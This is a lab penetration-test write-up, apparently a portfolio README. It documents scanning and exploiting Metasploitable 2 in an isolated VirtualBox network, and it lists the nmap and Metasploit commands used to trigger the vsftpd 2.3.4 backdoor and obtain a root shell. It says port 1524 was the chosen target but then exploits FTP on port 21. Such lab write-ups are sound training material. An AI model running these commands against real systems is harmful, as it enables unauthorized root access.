# Metasploitable Security Penetration Test

## Legal Disclaimer
This penetration test was conducted in an isolated lab environment on intentionally vulnerable software. All activity was performed legally and ethically for educational purposes only. Always obtain proper authorization before conducting penetration tests.

---

## Objective
Conduct a full penetration test against Metasploitable 2 using Kali Linux — performing reconnaissance, service enumeration, vulnerability identification, exploitation, and post-exploitation to demonstrate an end-to-end offensive security workflow.

---

## Tools & Technologies
| Tool | Purpose |
|---|---|
| VirtualBox | Hypervisor / isolated lab environment |
| Kali Linux | Attacker VM (192.168.56.104) |
| Metasploitable 2 Linux | Intentionally vulnerable target (192.168.56.106) |
| Nmap | Port scanning and service enumeration |
| Metasploit Framework v6.4.9 | Exploitation framework |
| vsftpd 2.3.4 backdoor | CVE exploited for root access |

---

## Lab Architecture
- Attacker: Kali Linux — 192.168.56.104
- Target: Metasploitable 2 — 192.168.56.106
- Both VMs on host-only network in VirtualBox
- Fully isolated — no external internet traffic

---

## Penetration Test Methodology

### Phase 1: Reconnaissance — Network Verification
- Ran ip a on both machines to confirm distinct IPs
- Verified connectivity between attacker and target

### Phase 2: Scanning & Enumeration
- Ran full Nmap scan against target:
  nmap -Pn -A 192.168.56.106
- Discovered 20+ open ports including:

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 23/tcp | Telnet | Linux telnetd |
| 80/tcp | HTTP | Apache |
| 512/tcp | exec | — |
| 1524/tcp | ingreslock | — |
| 3306/tcp | MySQL | — |
| 5900/tcp | VNC | — |

- Identified vsftpd 2.3.4 as a known backdoor vulnerability
- Selected port 1524 (ingreslock) as initial exploitation target

### Phase 3: Exploitation — vsftpd 2.3.4 Backdoor
- Launched Metasploit: msfconsole
- Searched for vsftpd module:
  search vsftp
- Found: exploit/unix/ftp/vsftpd_234_backdoor (Rank: Excellent)
- Configured and executed exploit:
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOST 192.168.56.106
  exploit

### Phase 4: Post-Exploitation
- Exploit output confirmed:
  UID: uid=0(root) gid=0(root)
- Achieved full root shell on target system
- Ran ls to enumerate root filesystem — confirmed complete system access
- Navigated root filesystem demonstrating full compromise

---

## Results
| Phase | Outcome |
|---|---|
| Reconnaissance | Target identified at 192.168.56.106 |
| Scanning | 20+ open ports enumerated |
| Exploitation | vsftpd 2.3.4 backdoor triggered successfully |
| Post-Exploitation | Root shell obtained (UID=0) |

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Port Scanning | T1595.001 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Key Takeaways
- vsftpd 2.3.4 contains a hardcoded backdoor triggered by a smiley face in the username — a critical unpatched vulnerability
- Nmap service version detection (-A flag) is essential for identifying exploitable software versions
- Metasploitable 2 demonstrates how unpatched legacy systems are trivially compromised
- Root access via a single CVE exploit highlights the importance of patch management

---

## Skills Demonstrated
Penetration Testing, Nmap, Service Enumeration, Metasploit Framework, CVE Exploitation, Post-Exploitation, MITRE ATT&CK, Kali Linux, VirtualBox, Offensive Security Methodology
